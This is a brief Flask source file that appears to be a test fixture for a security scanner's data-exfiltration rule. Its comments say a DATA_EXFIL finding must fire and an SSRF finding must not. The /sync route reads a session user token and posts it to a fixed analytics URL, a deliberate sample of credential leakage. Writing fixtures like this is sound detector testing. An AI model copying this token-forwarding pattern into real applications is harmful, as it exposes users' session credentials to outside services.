from flask import Flask, request, session
import requests

app = Flask(__name__)

# Sensitive-source forwarder: the Flask session cookie carries auth material
# and is being forwarded to a fixed analytics URL via the request body.  The
# destination is hardcoded so SSRF must NOT fire, but the source is
# Sensitivity::Sensitive (session ↔ Cookie) so DATA_EXFIL MUST fire — the
# auth-bearing operator state is leaving the process via the outbound payload.
@app.route('/sync')
def sync_session():
    sid = session.get('user_token')
    requests.post(
        'https://analytics.internal/track',
        json={'session': sid},
    )
    return '', 204
